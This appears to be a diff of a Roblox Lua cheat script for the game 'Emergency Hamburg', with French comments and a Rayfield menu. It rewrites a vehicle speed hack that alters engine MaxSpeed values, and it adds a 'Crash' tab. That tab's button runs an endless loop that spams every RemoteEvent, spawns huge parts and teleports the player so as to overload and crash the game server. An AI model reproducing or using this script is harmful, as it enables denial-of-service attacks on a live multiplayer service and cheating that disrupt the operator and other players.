@@ -10,19 +10,19 @@ print("✅ Rayfield UI chargé avec succès !")
 -- 📌 Création de la fenêtre principale
 local Window = Rayfield:CreateWindow({
     Name = "Emergency Hamburg",
-    LoadingTitle = "Hamburg Script v1.0",
+    LoadingTitle = "Hamburg Script 🔥 v1.0",
     LoadingSubtitle = "By azfasty",
-    Theme = "Dark",
+    Theme = "Default",
     ConfigurationSaving = {Enabled = false}
 })
 
 -- 📌 Onglet Véhicule
 local VehicleTab = Window:CreateTab("Véhicule", "car")
-local VehicleSection = VehicleTab:CreateSection("Paramètres Véhicule")
 
 -- 🔹 Variables
 local speedBoostEnabled = false
 local boostMultiplier = 2  -- Par défaut, double la vitesse
+local originalSpeed = {}
 
 -- ✅ Toggle pour activer/désactiver le Speed Boost
 VehicleTab:CreateToggle({
@@ -31,6 +31,25 @@ VehicleTab:CreateToggle({
     Flag = "SpeedBoost",
     Callback = function(state)
         speedBoostEnabled = state
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character.Parent then
+            local vehicle = player.Character.Parent
+            if vehicle and vehicle:FindFirstChild("Engine") then
+                local engine = vehicle.Engine
+                if engine:FindFirstChild("MaxSpeed") then
+                    -- Sauvegarde de la vitesse de base
+                    if not originalSpeed[vehicle] then
+                        originalSpeed[vehicle] = engine.MaxSpeed.Value
+                    end
+                    
+                    if speedBoostEnabled then
+                        engine.MaxSpeed.Value = originalSpeed[vehicle] * boostMultiplier
+                    else
+                        engine.MaxSpeed.Value = originalSpeed[vehicle]
+                    end
+                end
+            end
+        end
     end
 })
 
@@ -46,30 +65,51 @@ VehicleTab:CreateSlider({
     end
 })
 
--- 🎯 Fonction pour appliquer le Speed Boost
-local function applySpeedBoost()
-    while true do
-        if speedBoostEnabled then
-            local vehicle = game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character.Parent
-            if vehicle and vehicle:FindFirstChild("Humanoid") and vehicle:FindFirstChild("VehicleSeat") then
-                local seat = vehicle.VehicleSeat
-                seat.Throttle = 1  -- Accélération maximale
-                
-                -- Augmenter la vitesse du véhicule
-                if seat:FindFirstChild("Engine") then
-                    local engine = seat.Engine
-                    if engine:FindFirstChild("Torque") then
-                        engine.Torque.Value = engine.Torque.Value * boostMultiplier
-                    end
+-- ✅ Bouton pour remettre la vitesse normale
+VehicleTab:CreateButton({
+    Name = "Réinitialiser la Vitesse",
+    Callback = function()
+        local player = game.Players.LocalPlayer
+        if player and player.Character and player.Character.Parent then
+            local vehicle = player.Character.Parent
+            if vehicle and vehicle:FindFirstChild("Engine") then
+                local engine = vehicle.Engine
+                if engine:FindFirstChild("MaxSpeed") and originalSpeed[vehicle] then
+                    engine.MaxSpeed.Value = originalSpeed[vehicle]
                 end
             end
         end
-        wait(0.1)
     end
-end
+})
 
--- 🔥 Lancer le Speed Boost en arrière-plan
-spawn(applySpeedBoost)
+-- 📌 Onglet Crash Serveur
+local CrashTab = Window:CreateTab("Crash", "alert-triangle")
 
--- ✅ Vérification du bon chargement
-print("🔥 Speed Boost pour voiture chargé avec succès !")
+-- ✅ Bouton pour crasher le serveur
+CrashTab:CreateButton({
+    Name = "⚠️ CRASHER LE SERVEUR",
+    Callback = function()
+        while true do
+            -- 1️⃣ Spam des Remote Events pour surcharger le serveur
+            for _, v in pairs(game:GetDescendants()) do
+                if v:IsA("RemoteEvent") then
+                    v:FireServer()
+                end
+            end
+            
+            -- 2️⃣ Création infinie d'objets pour surcharger la mémoire
+            local obj = Instance.new("Part")
+            obj.Parent = game.Workspace
+            obj.Size = Vector3.new(1000, 1000, 1000)
+            obj.Anchored = true
+            
+            -- 3️⃣ Téléportation rapide (le serveur ne suit plus)
+            local player = game.Players.LocalPlayer
+            if player and player.Character then
+                player.Character:SetPrimaryPartCFrame(player.Character:GetPrimaryPartCFrame() * CFrame.new(100, 0, 0))
+            end
+        end
+    end
+})
+
+print("🔥 Speed Boost & Crash Serveur chargé avec succès !")
